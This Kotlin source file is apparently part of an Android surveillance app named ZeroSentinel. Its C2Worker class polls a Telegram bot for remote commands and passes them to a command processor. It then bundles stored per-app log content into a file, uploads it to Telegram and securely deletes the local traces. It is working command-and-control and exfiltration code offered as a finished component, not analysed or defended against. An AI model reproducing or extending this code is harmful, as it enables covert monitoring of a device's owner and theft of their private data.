package com.zero.sentinel.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.zero.sentinel.ZeroSentinelApp
import com.zero.sentinel.network.CommandProcessor
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.SecureDelete
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class C2Worker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val repository = (appContext.applicationContext as ZeroSentinelApp).repository
    private val telegramClient = TelegramClient(appContext)
    private val commandProcessor = CommandProcessor(appContext, repository, telegramClient)

    // In a real production app, we should persist the last update ID to SharedPreferences
    // to avoid processing old messages. For now, we rely on Telegram's logic or simple memory if worker stays alive (it won't).
    // TODO: Ideally pass lastUpdateId via inputData or SharedPreferences.
    // However, getUpdates with offset=0 returns all unconfirmed updates. If we confirm them (by using offset = last_id + 1), they vanish.
    // So we need to store the last processed ID in SharedPreferences.
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d("C2Worker", "Starting C2 cycle")

            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
            val lastUpdateId = prefs.getLastUpdateId()
            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
            
            Log.d("C2Worker", "Polling updates with offset: $nextOffset")
            
            val updates = telegramClient.pollUpdates(nextOffset)
            val maxUpdateId = commandProcessor.processUpdates(updates)
            
            if (maxUpdateId > lastUpdateId) {
                prefs.saveLastUpdateId(maxUpdateId)
                Log.d("C2Worker", "New max update ID saved: $maxUpdateId")
            }

            // 2. Upload Logs
            uploadLogs()

            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e("C2Worker", "Error in C2 cycle", e)
            return@withContext Result.retry()
        }
    }

    private suspend fun uploadLogs() {
        val logs = repository.getAllLogs()
        if (logs.isEmpty()) return

        val deviceName = com.zero.sentinel.utils.DeviceInfoHelper.getSafeDeviceName()
        val timeStamp = SimpleDateFormat("yyyy-MM-dd_HH-mm", Locale.getDefault()).format(Date())
        val fileName = "logs_${deviceName}_${timeStamp}.txt"
        val file = File(applicationContext.cacheDir, fileName)

        try {
            FileWriter(file).use { writer ->
                logs.forEach { log ->
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(log.timestamp))
                    writer.append("$date | ${log.type} | ${log.packageName} | ${log.content}\n")
                }
            }

            // Send to Telegram
            val success = telegramClient.sendDocument(file)

            if (success) {
                // Cleanup on success
                repository.deleteAllLogs()
                SecureDelete.deleteSecurely(file)
                Log.i("C2Worker", "Uploaded & secure deleted ${logs.size} logs")
            } else {
                Log.e("C2Worker", "Upload failed. Logs retained.")
                // Delete temp file but keep logs in DB
                SecureDelete.deleteSecurely(file)
            }

        } catch (e: Exception) {
            Log.e("C2Worker", "Failed to upload logs", e)
            // If failed, we don't delete logs from DB so we can retry later.
            // But we should delete the temp file.
            if (file.exists()) {
                file.delete()
            }
            throw e
        }
    }
}
